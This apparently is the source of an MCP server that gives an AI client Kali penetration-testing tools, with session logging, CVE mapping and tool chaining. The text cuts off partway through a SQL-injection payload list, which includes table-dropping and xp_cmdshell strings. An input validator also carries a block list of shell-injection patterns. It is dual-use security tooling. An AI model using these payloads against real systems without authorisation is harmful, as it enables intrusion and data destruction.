#!/usr/bin/env python3
"""
Kali MCP Server v4 - Professional Penetration Testing & Bug Bounty Platform
============================================================================
Advanced architecture with:
- Per-session/per-target hierarchical logging with forensic trace
- Real-time progress feedback
- Tool chaining & cross-referencing framework
- CVE cartography per device with recommended patches
- VulnX integration for advanced vulnerability correlation
- Security-hardened input validation
- Multi-platform bug bounty support (HackerOne, Bugcrowd, Intigriti, Immunefi)

Author: Cabrel10 / MorningStar
License: MIT
"""

import asyncio
import subprocess
import json
import logging
import shlex
import tempfile
import os
import re
import datetime
import xml.etree.ElementTree as ET
import hashlib
import base64
import urllib.parse
import uuid
import time
import traceback
import socket
import threading
from typing import Dict, Any, Optional, List, Tuple, Callable
from functools import wraps
from dataclasses import dataclass, asdict, field
from enum import Enum
from pathlib import Path
from collections import defaultdict

from fastmcp import FastMCP

# ============================================================================
# CONFIGURATION
# ============================================================================

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
SESSIONS_DIR = os.path.join(BASE_DIR, "sessions")
PAYLOADS_DIR = os.path.join(BASE_DIR, "payloads")
CVE_CACHE_DIR = os.path.join(BASE_DIR, "cve_cache")
CHAIN_DIR = os.path.join(BASE_DIR, "chain_results")

for d in [SESSIONS_DIR, PAYLOADS_DIR, CVE_CACHE_DIR, CHAIN_DIR]:
    os.makedirs(d, exist_ok=True)

# Logging configuration
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    handlers=[
        logging.FileHandler(os.path.join(BASE_DIR, "kali_mcp_server.log")),
        logging.StreamHandler(),
    ],
)
logger = logging.getLogger("KaliMCP")


# ============================================================================
# ENUMS AND DATA CLASSES
# ============================================================================

class ScanIntensity(Enum):
    STEALTH = "stealth"
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    AGGRESSIVE = "aggressive"

class VulnerabilityLevel(Enum):
    INFO = "info"
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"

class ToolStatus(Enum):
    PENDING = "pending"
    RUNNING = "running"
    COMPLETED = "completed"
    FAILED = "failed"

@dataclass
class TraceEntry:
    """Single trace log entry for forensic audit"""
    timestamp: str
    level: str
    phase: str
    message: str
    data: Optional[Dict] = None

@dataclass
class ToolExecution:
    """Complete execution record for a tool run"""
    tool_name: str
    session_id: str
    target: str
    execution_id: str
    start_time: str
    end_time: Optional[str] = None
    status: str = "running"
    inputs: Dict = field(default_factory=dict)
    outputs: Dict = field(default_factory=dict)
    traces: List[Dict] = field(default_factory=list)
    progress: List[Dict] = field(default_factory=list)
    errors: List[str] = field(default_factory=list)
    chained_from: Optional[str] = None
    chained_to: List[str] = field(default_factory=list)
    command_log: List[Dict] = field(default_factory=list)
    duration_seconds: float = 0.0

# ============================================================================
# SESSION MANAGER - Hierarchical per-session/per-target logging
# ============================================================================

class SessionManager:
    """
    Manages pentest sessions with hierarchical storage:
    sessions/{session_id}/{target}/{tool_name}/{execution_id}/
        - execution.json    (full execution record)
        - trace.jsonl       (line-by-line forensic trace)
        - raw_output.txt    (raw command output)
        - artifacts/        (screenshots, files, etc.)
    """
    
    _instance = None
    _lock = threading.Lock()
    
    def __new__(cls):
        with cls._lock:
            if cls._instance is None:
                cls._instance = super().__new__(cls)
                cls._instance._initialized = False
            return cls._instance
    
    def __init__(self):
        if self._initialized:
            return
        self.current_session_id = None
        self.sessions = {}
        self._initialized = True
    
    def start_session(self, name: Optional[str] = None) -> str:
        ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        session_id = f"{name}_{ts}" if name else f"session_{ts}"
        session_dir = os.path.join(SESSIONS_DIR, session_id)
        os.makedirs(session_dir, exist_ok=True)
        
        self.current_session_id = session_id
        self.sessions[session_id] = {
            "id": session_id,
            "start_time": datetime.datetime.now().isoformat(),
            "targets": {},
            "tool_count": 0,
            "chain_count": 0,
            "directory": session_dir
        }
        
        # Write session manifest
        manifest_path = os.path.join(session_dir, "session_manifest.json")
        with open(manifest_path, 'w') as f:
            json.dump(self.sessions[session_id], f, indent=2, default=str)
        
        logger.info(f"Session started: {session_id} -> {session_dir}")
        return session_id
    
    def get_session_id(self) -> str:
        if not self.current_session_id:
            return self.start_session("auto")
        return self.current_session_id
    
    def get_execution_dir(self, target: str, tool_name: str, execution_id: str) -> str:
        session_id = self.get_session_id()
        safe_target = sanitize_filename(target)
        safe_tool = sanitize_filename(tool_name)
        
        exec_dir = os.path.join(
            SESSIONS_DIR, session_id, safe_target, safe_tool, execution_id
        )
        os.makedirs(exec_dir, exist_ok=True)
        os.makedirs(os.path.join(exec_dir, "artifacts"), exist_ok=True)
        
        # Track target in session
        if session_id in self.sessions:
            if safe_target not in self.sessions[session_id]["targets"]:
                self.sessions[session_id]["targets"][safe_target] = []
            self.sessions[session_id]["targets"][safe_target].append({
                "tool": tool_name,
                "execution_id": execution_id,
                "timestamp": datetime.datetime.now().isoformat()
            })
            self.sessions[session_id]["tool_count"] += 1
        
        return exec_dir
    
    def list_session_targets(self) -> Dict:
        session_id = self.get_session_id()
        return self.sessions.get(session_id, {}).get("targets", {})


# ============================================================================
# TRACE LOGGER - Forensic-level execution tracing
# ============================================================================

class TraceLogger:
    """
    Records every step of tool execution as forensic proof.
    Writes both to memory (for return) and to disk (JSONL file).
    """
    
    def __init__(self, execution_dir: str, tool_name: str):
        self.execution_dir = execution_dir
        self.tool_name = tool_name
        self.trace_file = os.path.join(execution_dir, "trace.jsonl")
        self.traces = []
        self.start_time = time.time()
    
    def log(self, level: str, phase: str, message: str, data: Optional[Dict] = None):
        entry = {
            "timestamp": datetime.datetime.now().isoformat(),
            "elapsed_ms": round((time.time() - self.start_time) * 1000, 2),
            "level": level,
            "phase": phase,
            "tool": self.tool_name,
            "message": message,
        }
        if data:
            # Truncate large data for trace
            entry["data"] = _truncate_dict(data, max_str_len=500)
        
        self.traces.append(entry)
        
        try:
            with open(self.trace_file, 'a') as f:
                f.write(json.dumps(entry, default=str) + "\n")
        except Exception as e:
            logger.error(f"Trace write error: {e}")
    
    def info(self, phase: str, message: str, data: Optional[Dict] = None):
        self.log("INFO", phase, message, data)
    
    def warn(self, phase: str, message: str, data: Optional[Dict] = None):
        self.log("WARN", phase, message, data)
    
    def error(self, phase: str, message: str, data: Optional[Dict] = None):
        self.log("ERROR", phase, message, data)
    
    def debug(self, phase: str, message: str, data: Optional[Dict] = None):
        self.log("DEBUG", phase, message, data)
    
    def command(self, cmd: Any, result: Dict = None):
        """Log a command execution with full details"""
        if result is None:
            result = {}
        self.log("CMD", "command_execution", f"Executed: {cmd}", {
            "command": str(cmd),
            "return_code": result.get("return_code"),
            "success": result.get("success"),
            "execution_time": result.get("execution_time"),
            "stdout_preview": (result.get("stdout", "") or "")[:300],
            "stderr_preview": (result.get("stderr", "") or "")[:200]
        })
    
    def get_traces(self) -> List[Dict]:
        return self.traces


# ============================================================================
# PROGRESS REPORTER - Real-time progress feedback
# ============================================================================

class ProgressReporter:
    """
    Tracks and reports progress during tool execution.
    Provides percentage-based progress with step descriptions.
    """
    
    def __init__(self, tool_name: str, total_steps: int, trace: TraceLogger):
        self.tool_name = tool_name
        self.total_steps = max(total_steps, 1)
        self.current_step = 0
        self.steps = []
        self.trace = trace
    
    def update(self, step_name: str, detail: str = ""):
        self.current_step += 1
        pct = min(round((self.current_step / self.total_steps) * 100, 1), 100.0)
        step_info = {
            "step": self.current_step,
            "total": self.total_steps,
            "percent": pct,
            "name": step_name,
            "detail": detail,
            "timestamp": datetime.datetime.now().isoformat()
        }
        self.steps.append(step_info)
        self.trace.info("progress", f"[{pct}%] {step_name}", step_info)
        logger.info(f"[{self.tool_name}] Progress: {pct}% - {step_name}")
    
    def get_progress(self) -> List[Dict]:
        return self.steps


# ============================================================================
# TOOL CHAINING FRAMEWORK
# ============================================================================

class ToolChainEngine:
    """
    Enables tools to feed results into other tools automatically.
    Tracks cross-references and dependencies between tool outputs.
    """
    
    _instance = None
    
    def __new__(cls):
        if cls._instance is None:
            cls._instance = super().__new__(cls)
            cls._instance._initialized = False
        return cls._instance
    
    def __init__(self):
        if self._initialized:
            return
        self.results_store = {}  # {tool_name: {target: latest_result}}
        self.chains = []
        self.cross_references = defaultdict(list)
        self._initialized = True
    
    def store_result(self, tool_name: str, target: str, result: Dict):
        key = f"{tool_name}:{target}"
        self.results_store[key] = {
            "result": result,
            "timestamp": datetime.datetime.now().isoformat(),
            "tool": tool_name,
            "target": target
        }
    
    def get_result(self, tool_name: str, target: str) -> Optional[Dict]:
        key = f"{tool_name}:{target}"
        entry = self.results_store.get(key)
        return entry["result"] if entry else None
    
    def get_related_results(self, target: str) -> Dict[str, Dict]:
        """Get all results for a given target across tools"""
        related = {}
        for key, entry in self.results_store.items():
            if entry["target"] == target or target in entry["target"]:
                related[entry["tool"]] = entry["result"]
        return related
    
    def add_cross_reference(self, from_tool: str, to_tool: str, target: str, ref_data: Dict):
        self.cross_references[target].append({
            "from": from_tool,
            "to": to_tool,
            "data": ref_data,
            "timestamp": datetime.datetime.now().isoformat()
        })
    
    def enrich_with_context(self, tool_name: str, target: str, current_result: Dict) -> Dict:
        """Enrich current tool result with data from previous tool runs on same target"""
        related = self.get_related_results(target)
        if not related:
            return current_result
        
        context = {}
        
        # Pull nmap data for service correlation
        nmap_result = related.get("nmap_scan")
        if nmap_result and tool_name != "nmap_scan":
            context["known_services"] = nmap_result.get("services", [])
            context["known_ports"] = nmap_result.get("open_ports", [])
            context["os_detection"] = nmap_result.get("os_detection", [])
        
        # Pull subdomain data
        sub_result = related.get("subdomain_scanner") or related.get("subdomain_enum")
        if sub_result and tool_name not in ["subdomain_scanner", "subdomain_enum"]:
            context["known_subdomains"] = sub_result.get("subdomains", [])[:20]
        
        # Pull tech detection
        tech_result = related.get("web_tech_detect")
        if tech_result and tool_name != "web_tech_detect":
            context["known_technologies"] = tech_result.get("technologies", [])
            context["server"] = tech_result.get("server", "")
        
        # Pull CVE data
        cve_result = related.get("cve_cartography")
        if cve_result and tool_name != "cve_cartography":
            context["known_cves"] = cve_result.get("cves", [])[:10]
        
        # Pull header audit
        hdr_result = related.get("header_security_audit")
        if hdr_result and tool_name != "header_security_audit":
            context["security_grade"] = hdr_result.get("grade", "")
            context["missing_headers"] = hdr_result.get("headers_missing", [])
        
        if context:
            current_result["_chain_context"] = context
            current_result["_enriched_by"] = list(related.keys())
        
        return current_result
    
    def get_chain_summary(self, target: str) -> Dict:
        related = self.get_related_results(target)
        refs = self.cross_references.get(target, [])
        return {
            "target": target,
            "tools_executed": list(related.keys()),
            "cross_references": refs,
            "total_tools": len(related)
        }


# ============================================================================
# CVE CARTOGRAPHY ENGINE
# ============================================================================

class CVECartographer:
    """
    Maps discovered services to known CVEs with severity and patch info.
    Uses NVD API and local cache for performance.
    """
    
    # Curated CVE database for common services (offline fallback)
    KNOWN_CVES = {
        "apache": {
            "2.4.49": [
                {"cve": "CVE-2021-41773", "severity": "critical", "cvss": 9.8,
                 "description": "Path traversal and RCE in Apache HTTP Server 2.4.49",
                 "patch": "Upgrade to Apache 2.4.51+",
                 "references": ["https://nvd.nist.gov/vuln/detail/CVE-2021-41773"]},
                {"cve": "CVE-2021-42013", "severity": "critical", "cvss": 9.8,
                 "description": "Path traversal bypass of CVE-2021-41773 fix",
                 "patch": "Upgrade to Apache 2.4.51+",
                 "references": ["https://nvd.nist.gov/vuln/detail/CVE-2021-42013"]}
            ],
            "2.4.50": [
                {"cve": "CVE-2021-42013", "severity": "critical", "cvss": 9.8,
                 "description": "Incomplete fix for path traversal in 2.4.50",
                 "patch": "Upgrade to Apache 2.4.51+",
                 "references": ["https://nvd.nist.gov/vuln/detail/CVE-2021-42013"]}
            ],
            "2.4": [
                {"cve": "CVE-2023-25690", "severity": "critical", "cvss": 9.8,
                 "description": "HTTP request smuggling via mod_proxy",
                 "patch": "Upgrade to Apache 2.4.56+",
                 "references": ["https://nvd.nist.gov/vuln/detail/CVE-2023-25690"]},
                {"cve": "CVE-2023-43622", "severity": "high", "cvss": 7.5,
                 "description": "HTTP/2 DoS via zero-length headers",
                 "patch": "Upgrade to Apache 2.4.58+",
                 "references": ["https://nvd.nist.gov/vuln/detail/CVE-2023-43622"]}
            ]
        },
        "nginx": {
            "1.": [
                {"cve": "CVE-2021-23017", "severity": "critical", "cvss": 9.4,
                 "description": "DNS resolver off-by-one heap write",
                 "patch": "Upgrade to nginx 1.21.0+ / 1.20.1+",
                 "references": ["https://nvd.nist.gov/vuln/detail/CVE-2021-23017"]},
                {"cve": "CVE-2022-41741", "severity": "high", "cvss": 7.8,
                 "description": "Memory corruption in mp4 module",
                 "patch": "Upgrade to nginx 1.23.2+",
                 "references": ["https://nvd.nist.gov/vuln/detail/CVE-2022-41741"]}
            ]
        },
        "openssh": {
            "8.": [
                {"cve": "CVE-2023-38408", "severity": "critical", "cvss": 9.8,
                 "description": "Remote code execution via ssh-agent forwarding",
                 "patch": "Upgrade to OpenSSH 9.3p2+",
                 "references": ["https://nvd.nist.gov/vuln/detail/CVE-2023-38408"]}
            ],
            "9.": [
                {"cve": "CVE-2024-6387", "severity": "critical", "cvss": 8.1,
                 "description": "RegreSSHion: RCE via race condition in signal handler",
                 "patch": "Upgrade to OpenSSH 9.8+",
                 "references": ["https://nvd.nist.gov/vuln/detail/CVE-2024-6387"]}
            ]
        },
        "mysql": {
            "5.": [
                {"cve": "CVE-2023-22008", "severity": "medium", "cvss": 4.9,
                 "description": "MySQL Server InnoDB vulnerability",
                 "patch": "Upgrade to MySQL 8.0.34+",
                 "references": ["https://nvd.nist.gov/vuln/detail/CVE-2023-22008"]}
            ],
            "8.": [
                {"cve": "CVE-2024-20960", "severity": "medium", "cvss": 6.5,
                 "description": "MySQL Server optimizer vulnerability",
                 "patch": "Apply Oracle Critical Patch Update",
                 "references": ["https://nvd.nist.gov/vuln/detail/CVE-2024-20960"]}
            ]
        },
        "vsftp": {
            "2.3.4": [
                {"cve": "CVE-2011-2523", "severity": "critical", "cvss": 10.0,
                 "description": "vsftpd 2.3.4 backdoor command execution",
                 "patch": "Upgrade to vsftpd 3.0+",
                 "references": ["https://nvd.nist.gov/vuln/detail/CVE-2011-2523"]}
            ]
        },
        "proftpd": {
            "1.3": [
                {"cve": "CVE-2019-12815", "severity": "critical", "cvss": 9.8,
                 "description": "Arbitrary file copy via mod_copy",
                 "patch": "Upgrade to ProFTPD 1.3.6+",
                 "references": ["https://nvd.nist.gov/vuln/detail/CVE-2019-12815"]}
            ]
        },
        "iis": {
            "10.": [
                {"cve": "CVE-2023-36899", "severity": "high", "cvss": 7.5,
                 "description": "ASP.NET elevation of privilege",
                 "patch": "Apply latest Windows security updates",
                 "references": ["https://nvd.nist.gov/vuln/detail/CVE-2023-36899"]}
            ]
        },
        "php": {
            "8.": [
                {"cve": "CVE-2024-4577", "severity": "critical", "cvss": 9.8,
                 "description": "CGI argument injection on Windows",
                 "patch": "Upgrade to PHP 8.3.8+",
                 "references": ["https://nvd.nist.gov/vuln/detail/CVE-2024-4577"]}
            ],
            "7.": [
                {"cve": "CVE-2019-11043", "severity": "critical", "cvss": 9.8,
                 "description": "Remote code execution via fastcgi",
                 "patch": "Upgrade to PHP 7.4+",
                 "references": ["https://nvd.nist.gov/vuln/detail/CVE-2019-11043"]}
            ]
        },
        "wordpress": {
            "": [
                {"cve": "CVE-2023-2982", "severity": "critical", "cvss": 9.8,
                 "description": "Authentication bypass in Social Login plugin",
                 "patch": "Update WordPress and all plugins",
                 "references": ["https://nvd.nist.gov/vuln/detail/CVE-2023-2982"]}
            ]
        },
        "tomcat": {
            "9.": [
                {"cve": "CVE-2024-23672", "severity": "high", "cvss": 7.5,
                 "description": "DoS via WebSocket connection",
                 "patch": "Upgrade to Tomcat 9.0.86+",
                 "references": ["https://nvd.nist.gov/vuln/detail/CVE-2024-23672"]}
            ],
            "10.": [
                {"cve": "CVE-2024-24549", "severity": "high", "cvss": 7.5,
                 "description": "HTTP/2 header handling DoS",
                 "patch": "Upgrade to Tomcat 10.1.19+",
                 "references": ["https://nvd.nist.gov/vuln/detail/CVE-2024-24549"]}
            ]
        },
        "samba": {
            "4.": [
                {"cve": "CVE-2023-3961", "severity": "critical", "cvss": 9.1,
                 "description": "Path traversal in Samba shares",
                 "patch": "Upgrade to Samba 4.19.1+",
                 "references": ["https://nvd.nist.gov/vuln/detail/CVE-2023-3961"]}
            ]
        },
        "redis": {
            "": [
                {"cve": "CVE-2023-41056", "severity": "high", "cvss": 8.1,
                 "description": "Heap overflow in Redis",
                 "patch": "Upgrade to Redis 7.2.4+",
                 "references": ["https://nvd.nist.gov/vuln/detail/CVE-2023-41056"]}
            ]
        },
        "elasticsearch": {
            "7.": [
                {"cve": "CVE-2023-31419", "severity": "high", "cvss": 7.5,
                 "description": "Stack overflow in search API",
                 "patch": "Upgrade to Elasticsearch 7.17.14+",
                 "references": ["https://nvd.nist.gov/vuln/detail/CVE-2023-31419"]}
            ]
        }
    }
    
    @classmethod
    def lookup_cves(cls, product: str, version: str) -> List[Dict]:
        """Look up CVEs for a product+version from local database"""
        product_lower = (product or "").lower()
        version_str = version or ""
        
        results = []
        for known_product, versions in cls.KNOWN_CVES.items():
            if known_product in product_lower:
                for ver_prefix, cves in versions.items():
                    if ver_prefix == "" or version_str.startswith(ver_prefix):
                        results.extend(cves)
        
        return results
    
    @classmethod
    def lookup_cves_online(cls, product: str, version: str) -> List[Dict]:
        """Query NVD API for CVEs (with fallback to local)"""
        local = cls.lookup_cves(product, version)
        
        # Try NVD API
        try:
            keyword = f"{product} {version}".strip()
            url = f"https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch={urllib.parse.quote(keyword)}&resultsPerPage=5"
            
            result = subprocess.run(
                ["curl", "-s", "--max-time", "10", url],
                capture_output=True, text=True, timeout=15
            )
            
            if result.returncode == 0 and result.stdout:
                data = json.loads(result.stdout)
                for vuln in data.get("vulnerabilities", [])[:5]:
                    cve_data = vuln.get("cve", {})
                    cve_id = cve_data.get("id", "")
                    
                    # Skip if already in local results
                    if any(l["cve"] == cve_id for l in local):
                        continue
                    
                    desc_list = cve_data.get("descriptions", [])
                    desc = next((d["value"] for d in desc_list if d.get("lang") == "en"), "")
                    
                    metrics = cve_data.get("metrics", {})
                    cvss_data = metrics.get("cvssMetricV31", [{}])
                    cvss_score = cvss_data[0].get("cvssData", {}).get("baseScore", 0) if cvss_data else 0
                    
                    severity = "info"
                    if cvss_score >= 9.0: severity = "critical"
                    elif cvss_score >= 7.0: severity = "high"
                    elif cvss_score >= 4.0: severity = "medium"
                    elif cvss_score > 0: severity = "low"
                    
                    local.append({
                        "cve": cve_id,
                        "severity": severity,
                        "cvss": cvss_score,
                        "description": desc[:300],
                        "patch": "Check vendor advisories",
                        "references": [f"https://nvd.nist.gov/vuln/detail/{cve_id}"],
                        "source": "nvd_api"
                    })
        except Exception as e:
            logger.debug(f"NVD API lookup failed: {e}")
        
        return local
    
    @classmethod
    def map_services_to_cves(cls, services: List[Dict], use_online: bool = False) -> Dict:
        """Map a list of discovered services to CVEs"""
        cartography = {
            "devices": [],
            "total_cves": 0,
            "critical_count": 0,
            "high_count": 0,
            "medium_count": 0
        }
        
        for svc in services:
            product = svc.get("product", "") or svc.get("service", "")
            version = svc.get("version", "") or ""
            port = svc.get("port", "")
            
            if use_online:
                cves = cls.lookup_cves_online(product, version)
            else:
                cves = cls.lookup_cves(product, version)
            
            device_entry = {
                "port": port,
                "service": svc.get("service", ""),
                "product": product,
                "version": version,
                "cves": cves,
                "cve_count": len(cves),
                "max_severity": max((c["severity"] for c in cves), default="none",
                                     key=lambda s: {"critical": 4, "high": 3, "medium": 2, "low": 1, "info": 0}.get(s, 0)),
                "patches_recommended": list(set(c.get("patch", "") for c in cves if c.get("patch")))
            }
            
            cartography["devices"].append(device_entry)
            cartography["total_cves"] += len(cves)
            cartography["critical_count"] += sum(1 for c in cves if c["severity"] == "critical")
            cartography["high_count"] += sum(1 for c in cves if c["severity"] == "high")
            cartography["medium_count"] += sum(1 for c in cves if c["severity"] == "medium")
        
        return cartography


# ============================================================================
# SECURITY HARDENING - Input validation for MCP server itself
# ============================================================================

class InputValidator:
    """Validates and sanitizes all tool inputs to prevent injection attacks"""
    
    # Characters that could be dangerous in shell commands
    DANGEROUS_CHARS = ['`', '$', '|', ';', '&', '>', '<', '\n', '\r']
    
    # Allowed characters for targets (domains, IPs, URLs)
    TARGET_PATTERN = re.compile(r'^[a-zA-Z0-9\.\-\_\:\/\?\=\&\%\#\@\[\]]+$')
    
    # IP address pattern
    IP_PATTERN = re.compile(r'^(\d{1,3}\.){3}\d{1,3}(/\d{1,2})?$')
    
    # Domain pattern
    DOMAIN_PATTERN = re.compile(r'^[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?)*$')
    
    @classmethod
    def sanitize_target(cls, target: str) -> str:
        """Sanitize a target string, removing dangerous characters"""
        if not target:
            raise ValueError("Target cannot be empty")
        
        # Remove null bytes
        target = target.replace('\x00', '')
        
        # Check for obvious injection attempts
        injection_patterns = [
            r';\s*rm\s', r';\s*dd\s', r';\s*mkfs',
            r'\$\(', r'`.*`', r'\|\|.*rm',
            r'>\s*/dev/', r';\s*shutdown', r';\s*reboot'
        ]
        for pattern in injection_patterns:
            if re.search(pattern, target, re.IGNORECASE):
                raise ValueError(f"Potentially dangerous input detected in target: {target[:50]}")
        
        return target.strip()
    
    @classmethod
    def validate_command_args(cls, args: List[str]) -> List[str]:
        """Validate command arguments are safe"""
        validated = []
        for arg in args:
            if isinstance(arg, str):
                # Block embedded shell commands
                if any(c in arg for c in ['`', '$(', '${']) and not arg.startswith('-'):
                    raise ValueError(f"Shell metacharacter in argument: {arg[:50]}")
                validated.append(arg)
            else:
                validated.append(str(arg))
        return validated
    
    @classmethod
    def validate_file_path(cls, path: str) -> str:
        """Ensure path doesn't traverse outside allowed directories"""
        if not path:
            raise ValueError("Path cannot be empty")
        
        # Normalize
        normalized = os.path.normpath(path)
        
        # Block traversal
        if '..' in normalized:
            raise ValueError(f"Path traversal detected: {path}")
        
        return normalized
    
    @classmethod
    def validate_port(cls, port: int) -> int:
        """Validate port number"""
        if not isinstance(port, int) or port < 1 or port > 65535:
            raise ValueError(f"Invalid port: {port}")
        return port
    
    @classmethod
    def validate_timeout(cls, timeout: int, max_timeout: int = 7200) -> int:
        """Validate timeout value"""
        if not isinstance(timeout, (int, float)) or timeout < 1 or timeout > max_timeout:
            return min(max(int(timeout), 1), max_timeout)
        return int(timeout)


# ============================================================================
# UTILITY FUNCTIONS
# ============================================================================

def generate_timestamp() -> str:
    return datetime.datetime.now().strftime("%Y%m%d_%H%M%S")

def generate_execution_id() -> str:
    return f"{generate_timestamp()}_{uuid.uuid4().hex[:8]}"

def sanitize_filename(name: str) -> str:
    """Sanitize string for use as filename"""
    return re.sub(r'[^\w\-.]', '_', name.replace('://', '_').replace('/', '_'))[:100]

def _truncate_dict(d: Any, max_str_len: int = 500) -> Any:
    """Truncate strings in a dict structure for trace logging"""
    if isinstance(d, str):
        return d[:max_str_len] + "..." if len(d) > max_str_len else d
    elif isinstance(d, dict):
        return {k: _truncate_dict(v, max_str_len) for k, v in d.items()}
    elif isinstance(d, list):
        return [_truncate_dict(item, max_str_len) for item in d[:50]]
    return d

def run_command_advanced(
    command: Any,
    timeout: int = 600,
    env: Optional[Dict] = None,
    cwd: Optional[str] = None,
    shell: bool = False,
    trace: Optional[TraceLogger] = None
) -> Dict[str, Any]:
    """
    Advanced command execution with tracing, error handling, and timeout management.
    """
    start_time = datetime.datetime.now()
    cmd_str = command if isinstance(command, str) else ' '.join(command)
    
    if trace:
        trace.info("cmd_start", f"Executing: {cmd_str[:200]}")
    
    logger.info(f"Executing: {cmd_str[:200]}")
    
    try:
        process_env = os.environ.copy()
        if env:
            process_env.update(env)
        
        if shell and isinstance(command, list):
            command = ' '.join(command)
        
        result = subprocess.run(
            command,
            capture_output=True,
            text=True,
            timeout=timeout,
            check=False,
            env=process_env,
            cwd=cwd,
            shell=shell
        )
        
        execution_time = (datetime.datetime.now() - start_time).total_seconds()
        
        output = {
            "stdout": result.stdout.strip() if result.stdout else "",
            "stderr": result.stderr.strip() if result.stderr else "",
            "return_code": result.returncode,
            "execution_time": execution_time,
            "success": result.returncode == 0,
            "command": cmd_str
        }
        
        if trace:
            trace.command(cmd_str, output)
        
        return output
        
    except subprocess.TimeoutExpired as e:
        logger.error(f"Command timed out after {timeout}s: {cmd_str[:100]}")
        output = {
            "stdout": e.stdout.decode() if e.stdout else "",
            "stderr": f"TIMEOUT: Command exceeded {timeout} seconds",
            "return_code": -1,
            "execution_time": timeout,
            "success": False,
            "command": cmd_str
        }
        if trace:
            trace.error("cmd_timeout", f"Timeout after {timeout}s", output)
        return output
        
    except FileNotFoundError:
        cmd_name = command[0] if isinstance(command, list) else command.split()[0]
        logger.error(f"Command not found: {cmd_name}")
        output = {
            "stdout": "",
            "stderr": f"Command not found: {cmd_name}. Ensure the tool is installed.",
            "return_code": -1,
            "execution_time": 0,
            "success": False,
            "command": cmd_str
        }
        if trace:
            trace.error("cmd_not_found", f"Tool not installed: {cmd_name}", output)
        return output
        
    except Exception as e:
        logger.error(f"Command error: {e}")
        output = {
            "stdout": "",
            "stderr": str(e),
            "return_code": -1,
            "execution_time": 0,
            "success": False,
            "command": cmd_str
        }
        if trace:
            trace.error("cmd_exception", str(e), output)
        return output

def verify_output(
    file_path: str,
    expected_format: str = "text",
    min_size: int = 10,
    required_patterns: Optional[List[str]] = None
) -> Dict[str, Any]:
    """Verify output file exists and contains valid data"""
    result = {
        "valid": False,
        "file_exists": False,
        "file_size": 0,
        "format_valid": False,
        "has_data": False,
        "error": None
    }
    
    try:
        if not os.path.exists(file_path):
            result["error"] = f"File not found: {file_path}"
            return result
        
        result["file_exists"] = True
        result["file_size"] = os.path.getsize(file_path)
        
        if result["file_size"] < min_size:
            result["error"] = f"File too small ({result['file_size']} bytes)"
            return result
        
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        
        if not content.strip():
            result["error"] = "File is empty"
            return result
        
        if expected_format == "xml":
            try:
                ET.fromstring(content)
                result["format_valid"] = True
            except ET.ParseError as e:
                result["error"] = f"Invalid XML: {e}"
                return result
        elif expected_format == "json":
            try:
                json.loads(content)
                result["format_valid"] = True
            except json.JSONDecodeError as e:
                result["error"] = f"Invalid JSON: {e}"
                return result
        else:
            result["format_valid"] = True
        
        if required_patterns:
            content_lower = content.lower()
            for pattern in required_patterns:
                if pattern.lower() in content_lower:
                    result["has_data"] = True
                    break
        else:
            result["has_data"] = True
        
        result["valid"] = result["format_valid"] and result["has_data"]
        return result
        
    except Exception as e:
        result["error"] = str(e)
        return result


# ============================================================================
# TOOL EXECUTION WRAPPER - Unified execution with trace + progress + chaining
# ============================================================================

# Global instances
session_mgr = SessionManager()
chain_engine = ToolChainEngine()

def log_tool_execution(tool_name: str, target: str, inputs: Dict, outputs: Dict,
                       trace: Optional[TraceLogger] = None,
                       progress: Optional[ProgressReporter] = None):
    """
    Unified logging: stores execution to hierarchical session directory.
    """
    execution_id = generate_execution_id()
    exec_dir = session_mgr.get_execution_dir(target, tool_name, execution_id)
    
    execution_record = {
        "tool": tool_name,
        "session_id": session_mgr.get_session_id(),
        "target": target,
        "execution_id": execution_id,
        "timestamp": datetime.datetime.now().isoformat(),
        "inputs": inputs,
        "outputs": outputs,
        "trace_entries": trace.get_traces() if trace else [],
        "progress_steps": progress.get_progress() if progress else [],
        "trace_count": len(trace.get_traces()) if trace else 0
    }
    
    try:
        # Write execution record
        exec_file = os.path.join(exec_dir, "execution.json")
        with open(exec_file, 'w') as f:
            json.dump(execution_record, f, indent=2, default=str)
        
        # Write raw output separately for large outputs
        raw_file = os.path.join(exec_dir, "raw_output.txt")
        raw_output = outputs.get("raw_output", "") or outputs.get("stdout", "")
        if isinstance(raw_output, str):
            with open(raw_file, 'w') as f:
                f.write(raw_output)
        
        # Store in chain engine for cross-referencing
        chain_engine.store_result(tool_name, target, outputs)
        
        logger.info(f"Logged {tool_name} -> {exec_dir}")
    except Exception as e:
        logger.error(f"Failed to log {tool_name}: {e}")


# ============================================================================
# PAYLOAD GENERATORS
# ============================================================================

class PayloadGenerator:
    """Advanced payload generation for various attack vectors"""
    
    @staticmethod
    def sql_injection_payloads(db_type: str = "generic") -> List[str]:
        generic = [
            "' OR '1'='1", "' OR '1'='1'--", "' OR '1'='1'/*",
            "' OR 1=1--", "' OR 1=1#", "admin'--",
            "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "1' ORDER BY 1--", "1' ORDER BY 10--",
            "' AND 1=1--", "' AND 1=2--",
            "'; DROP TABLE users--",
            "' AND SLEEP(5)--", "' AND BENCHMARK(10000000,SHA1('test'))--",
            "' WAITFOR DELAY '0:0:5'--",
            "1; EXEC xp_cmdshell('whoami')--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "' OR EXISTS(SELECT * FROM users WHERE username='admin')--",
            # Time-based blind
            "' AND IF(1=1,SLEEP(3),0)--",
            "'; SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END--",
            # Error-based
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
            "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        ]
        mysql_specific = [
            "' UNION SELECT @@version--",
            "' UNION SELECT user()--",
            "' UNION SELECT database()--",
            "' UNION SELECT table_name FROM information_schema.tables--",
